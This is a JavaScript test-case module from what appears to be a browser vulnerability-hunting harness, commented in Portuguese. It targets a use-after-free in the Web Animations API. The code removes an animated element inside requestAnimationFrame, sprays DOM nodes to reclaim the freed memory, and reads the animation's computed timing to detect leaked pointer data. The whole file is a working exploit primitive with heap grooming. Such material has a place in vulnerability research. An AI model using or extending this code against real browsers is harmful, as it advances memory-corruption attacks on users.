import { Groomer } from '../mod_groomer.js';

export default {
    id:       'CSS_ANIMATION_REMOVED_ELEMENT',
    category: 'DOM',
    risk:     'HIGH',
    description:
        'UAF via Web Animations API. Inicia uma animação complexa de Transform e ' +
        'destrói o elemento dentro de um requestAnimationFrame (rAF). A tentativa de ' +
        'ler o getComputedTiming() da animação morta acede ao RenderStyle C++ libertado.',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        this.target = document.createElement('div');
        this.target.style.width = "100px";
        this.sandbox.appendChild(this.target);
        
        void this.target.offsetWidth; // Força layout nativo

        // Criamos uma animação infinita gerida pelo C++
        this.anim = this.target.animate(
            [{ transform: 'translateX(0px)' }, { transform: 'translateX(1000px)' }], 
            { duration: 1000, iterations: Infinity }
        );
    },

    trigger: async function() {
        const self = this;
        return new Promise(resolve => {
            // Sincronizamos a destruição com o "Tick" de desenho da tela (60Hz)
            requestAnimationFrame(() => {
                try {
                    // O GATILHO: Arranca o alvo do DOM a meio do cálculo de matrizes
                    self.target.remove();
                    
                    // Inundação imediata para tentar sobrepor o RenderStyle
                    let trash = Groomer.sprayDOM('div', 200);

                    // A BOMBA: Lemos o estado calculado da animação.
                    // O C++ tem de ir ao Elemento/RenderStyle morto para devolver a resposta!
                    self.results.timing = self.anim.effect.getComputedTiming().progress;
                } catch(e) {
                    self.results.error = e.message;
                }
                resolve();
            });
        });
    },

    probe: [
        s => s.results.error || 'rAF Executado',
        
        // Probe de STALE DATA
        s => {
            let prog = s.results.timing;
            if (typeof prog === 'number') {
                // O progresso deve ser um float entre 0.0 e 1.0. 
                // Se for um número absurdo, o C++ leu ponteiros em vez do tempo de animação!
                if (prog < 0 || prog > 100) {
                    return prog; // Dispara STALE DATA no HUD
                }
            }
            return 0; // Seguro
        }
    ],

    cleanup: function() {
        try { this.anim.cancel(); } catch(e){}
        try { this.target.remove(); } catch(e){}
        this.target = null;
        this.anim = null;
        this.results = {};
    }
};
